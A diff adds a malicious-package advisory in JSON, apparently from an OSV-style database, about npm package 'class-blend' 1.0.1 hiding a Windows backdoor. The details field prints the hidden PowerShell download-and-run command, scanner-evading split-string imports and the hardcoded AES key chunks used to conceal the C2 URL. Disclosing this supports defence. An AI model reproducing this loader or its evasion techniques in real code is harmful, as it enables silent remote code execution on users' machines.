@@ -1,0 +1,75 @@
+{
+  "modified": "2026-05-24T16:10:58Z",
+  "published": "2026-05-24T16:10:58Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "class-blend ships a hidden PowerShell-based remote code execution backdoor in applyGlobalStyles",
+  "details": "The package advertises itself as a clsx/twMerge-style class-name merging utility, but the exported applyGlobalStyles({palette, accents}) function contains a hidden Windows backdoor. dist/index.js dynamically imports node:crypto and node:child_process via split-string concatenation (e.g., [\"no\",\"de\",\":\",\"cry\",\"pto\"].join(\"\")) to evade static scanners. It then uses a hardcoded 32-byte AES-256-CBC key assembled from an array of hex chunks ([\"a7b80b01\",\"7e76fb52\",\"fa527621\",\"f76027d2\",\"19014dfc\",\"a59b49ae\",\"3db97ff3\",\"ab4a72fa\"]) to decrypt a URL: the caller-supplied accents array is treated as the IV and the palette array is treated as ciphertext. The decrypted URL is passed to a hidden PowerShell invocation: powershell.exe -WindowStyle Hidden -NoProfile -Command \"irm \u003cdecrypted-url\u003e -o $env:TEMP\\s.js; node $env:TEMP\\s.js\", spawned with {detached:true, stdio:'ignore', windowsHide:true}.unref(). Any consumer who imports class-blend and calls the documented applyGlobalStyles API on Windows will silently download and execute attacker JavaScript. The encrypted-URL design lets the attacker rotate the C2 endpoint by publishing new palette/accents values to users while leaving the package source unchanged. The combined fingerprint — split-string dynamic require, AES-decrypted C2 hidden in API arguments, hidden-window detached PowerShell, irm-to-node piping, and a total mismatch between advertised purpose and behavior — is unambiguously malicious.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "class-blend"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/index.js",
+              "sha256": "e8ab7661d11abef0e548582f12d178f43001f449f5df6b6445424f814544620e",
+              "tlsh": "50c300ca71a23132d32b686048bf018bf377dda0177e4481d159a2adb63441ea6b7f7d"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "class-blend-1.0.1.tgz",
+              "hashes": {
+                "sha1": "fa529d16c59c1055440e921e76631191e369ad30",
+                "sha512_sri": "sha512-bPewkOPIsKLG2Y688xX485p0bGNbgzbH+U3GS8zVrYO8wK9vqit7EQeDFAKceC+Npaphnu9JlNmq7bhxDwHX8Q=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/class-blend/v/1.0.1"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "d3876854a76bda6892f76b9b44c67e066bfc6315a7e3d27431137727ff0ee728",
+        "import_time": "2026-05-26T05:52:45.140350577Z",
+        "id": "IN-MAL-2026-004513",
+        "modified_time": "2026-05-24T16:10:58Z",
+        "versions": [
+          "1.0.1"
+        ]
+      }
+    ]
+  }
+}
